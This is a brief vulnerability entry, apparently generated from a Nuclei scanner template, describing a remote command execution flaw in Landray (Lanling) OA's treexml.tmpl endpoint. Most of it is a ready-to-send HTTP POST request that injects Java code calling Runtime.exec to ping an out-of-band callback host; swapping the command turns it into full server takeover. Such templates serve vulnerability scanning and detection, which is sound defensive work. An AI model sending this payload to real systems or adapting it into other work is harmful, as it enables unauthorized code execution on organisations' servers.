# Vulnerability: Landray OA Treexml.tmpl - Remote Code Execution
**Classification:** CWE-78,CWE-94
**Source:** Nuclei Template (`landray-oa-treexml-rce.yaml`)

## Description
There is a remote command execution vulnerability in Lanling OA treexml.tmpl. An attacker can obtain server permissions by sending a specific request package.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /data/sys-common/treexml.tmpl HTTP/1.1
Host: {{Hostname}}
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded

s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
```

